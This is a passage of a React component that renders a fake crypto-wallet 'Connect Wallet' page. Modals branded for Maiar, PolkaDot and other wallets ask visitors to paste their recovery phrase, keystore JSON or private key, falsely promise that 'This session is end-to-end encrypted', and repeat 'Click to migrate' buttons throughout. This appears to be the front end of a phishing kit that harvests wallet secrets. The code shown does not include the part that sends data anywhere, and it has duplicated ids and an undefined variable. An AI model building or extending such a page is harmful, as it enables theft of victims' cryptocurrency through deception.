                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                    <hr className="mt-3" />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <img className="w-25" src={maiar} alt="metamask logo" />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">Maiar</span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                    <hr className="mt-3" />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <img
                        className="w-25"
                        src={polkadot}
                        alt="metamask logo"
                      />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">PolkaDot</span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Fragment>
  );
};

export default Header;
